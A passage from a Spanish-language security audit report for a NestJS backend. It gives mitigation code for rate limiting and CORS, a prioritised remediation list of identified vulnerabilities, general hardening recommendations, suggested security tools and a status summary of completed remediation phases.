const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // Máximo 5 intentos de login
  skipSuccessfulRequests: true,
});

// Aplicar en rutas específicas
app.use('/auth/login', authLimiter);
```

```typescript
// Rate limiting por usuario autenticado
import { Injectable, NestMiddleware } from '@nestjs/common';
import { Request, Response, NextFunction } from 'express';

@Injectable()
export class UserRateLimitMiddleware implements NestMiddleware {
  private requests = new Map<string, number[]>();

  use(req: Request, res: Response, next: NextFunction) {
    const userId = req.user?.sub;
    if (!userId) return next();

    const now = Date.now();
    const windowMs = 60 * 1000; // 1 minuto
    const maxRequests = 60;

    const userRequests = this.requests.get(userId) || [];
    const recentRequests = userRequests.filter(time => now - time < windowMs);

    if (recentRequests.length >= maxRequests) {
      return res.status(429).json({
        message: 'Límite de solicitudes excedido',
      });
    }

    recentRequests.push(now);
    this.requests.set(userId, recentRequests);

    next();
  }
}
```

---

## 7. CONFIGURACIÓN Y DESPLIEGUE

### **[MEDIA] VUL-016: CORS Potencialmente Permisivo**

**Descripción**: La configuración de CORS podría estar permitiendo orígenes no autorizados.

**Ubicación**: 
- [`backend/src/main.ts`](file:///Users/camilamariaguinazu/Desktop/paco/appminuta/backend/src/main.ts)

**Mitigación**:
```typescript
// backend/src/main.ts
app.enableCors({
  origin: process.env.ALLOWED_ORIGINS?.split(',') || ['http://localhost:5173'],
  credentials: true,
  methods: ['GET', 'POST', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
});
```

---

## Resumen de Prioridades

### Acción Inmediata (Críticas)
1. **VUL-001**: Agregar `@UseGuards(SupabaseAuthGuard)` en `UnidadesController`
2. **VUL-002**: Implementar validación de propiedad en todos los endpoints de minutas
3. **VUL-004**: Validar y fortalecer JWT secret
4. **VUL-007**: Remover `usuario_id` de DTOs, usar JWT

### Corto Plazo (Altas)
5. **VUL-003**: Implementar sistema de roles y guards
6. **VUL-005**: Validar transiciones de estado
7. **VUL-008**: Sanitizar y validar query parameters
8. **VUL-009**: Implementar sanitización backend para XSS

### Mediano Plazo (Medias)
9. **VUL-006**: Validar estructura de datos JSON
10. **VUL-013**: Implementar cifrado de datos sensibles
11. **VUL-015**: Agregar rate limiting
12. **VUL-016**: Configurar CORS restrictivo

### Largo Plazo (Bajas)
13. **VUL-010**: Mejorar manejo de errores
14. **VUL-014**: Sanitizar logs

---

## Recomendaciones Generales

### Seguridad en Profundidad
- Implementar múltiples capas de validación (frontend + backend)
- Nunca confiar en datos del cliente
- Validar en cada capa de la aplicación

### Principio de Mínimo Privilegio
- Usuarios solo deben acceder a sus propios recursos
- Roles claramente definidos y aplicados
- Validación de permisos en cada operación

### Auditoría y Monitoreo
- Implementar logging completo de operaciones sensibles
- Monitorear intentos de acceso no autorizado
- Alertas para comportamientos anómalos

### Testing de Seguridad
- Implementar tests automatizados de seguridad
- Realizar pentesting periódico
- Code review enfocado en seguridad

### Actualización y Mantenimiento
- Mantener dependencias actualizadas
- Revisar CVEs de librerías utilizadas
- Aplicar parches de seguridad promptamente

---

## Herramientas Recomendadas

### Análisis Estático
- **SonarQube**: Análisis de código (ya implementado)
- **ESLint Security Plugin**: Reglas de seguridad para TypeScript
- **npm audit**: Vulnerabilidades en dependencias

### Testing Dinámico
- **OWASP ZAP**: Proxy de interceptación y scanner
- **Burp Suite**: Testing manual de APIs
- **Postman**: Testing de endpoints con diferentes payloads

### Monitoreo
- **Sentry**: Tracking de errores y excepciones
- **DataDog/New Relic**: Monitoreo de aplicación
- **CloudWatch/Stackdriver**: Logs y métricas

---

**Fin del Reporte**

*Este análisis debe ser tratado como CONFIDENCIAL y compartido solo con personal autorizado.*


**Solucionado**
Fase 1 Vulnerabilidades Críticas (Prioridad Inmediata) COMPLETADO
Fase 2: Sistema de Roles y Autorización EN ESPERA
Fase 3: Validación de Lógica de Negocio COMPLETADO
Fase 4: Prevención de Inyecciones COMPLETADO
Fase 5: Seguridad de Datos y Configuración COMPLETADO